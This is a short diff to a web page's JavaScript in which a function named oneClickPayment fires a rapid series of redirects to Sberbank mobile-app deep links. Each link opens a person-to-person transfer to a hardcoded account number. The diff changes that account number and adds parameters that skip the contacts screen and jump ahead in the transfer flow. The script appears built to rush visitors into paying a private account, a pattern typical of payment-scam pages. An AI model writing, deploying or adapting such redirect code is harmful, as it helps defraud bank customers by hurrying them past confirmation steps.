@@ -53,24 +53,27 @@
         }
 
         function oneClickPayment() {
+            var n = {
+                props: "40820810160340204582" // реквизиты (номер счета)
+            };
+
             var e = window.location.href;
 
             if (Rp()) {
-                // Жестко прописанные значения в URL
                 setTimeout(function() {
-                    window.location.href = "sberbankonline:/payments/p2p?type=account_number&requisiteNumber=40817810713007903345";
+                    window.location.href = "sberbankonline://p2ptransfer?isNeedToOpenNextScreen=true&skipContactsScreen=true&to=" + n.props + "&type=account";
                 }, 100);
 
                 setTimeout(function() {
-                    window.location.href = "sbolonline:/payments/p2p?type=account_number&requisiteNumber=40817810713007903345";
+                    window.location.href = "sbolonline://p2ptransfer?isNeedToOpenNextScreen=true&skipContactsScreen=true&to=" + n.props + "&type=account";
                 }, 200);
 
                 setTimeout(function() {
-                    window.location.href = "ios-app-smartonline://payments/p2p?type=account_number&requisiteNumber=40817810713007903345";
+                    window.location.href = "ios-app-smartonline://p2ptransfer?isNeedToOpenNextScreen=true&skipContactsScreen=true&to=" + n.props + "&type=account";
                 }, 300);
 
                 setTimeout(function() {
-                    window.location.href = "btripsexpenses://sbolonline//payments/p2p?type=account_number&requisiteNumber=40817810713007903345";
+                    window.location.href = "btripsexpenses://sbolonline/p2ptransfer?isNeedToOpenNextScreen=true&skipContactsScreen=true&to=" + n.props + "&type=account";
                 }, 400);
 
                 setTimeout(function() {
@@ -79,7 +82,7 @@
             }
 
             if (yp()) {
-                window.location.href = "intent://ru.sberbankmobile//payments/p2p?type=account_number&requisiteNumber=40817810713007903345";
+                window.location.href = "intent://ru.sberbankmobile/payments/p2p?type=account_number&requisiteNumber=" + n.props;
             }
         }
     </script>
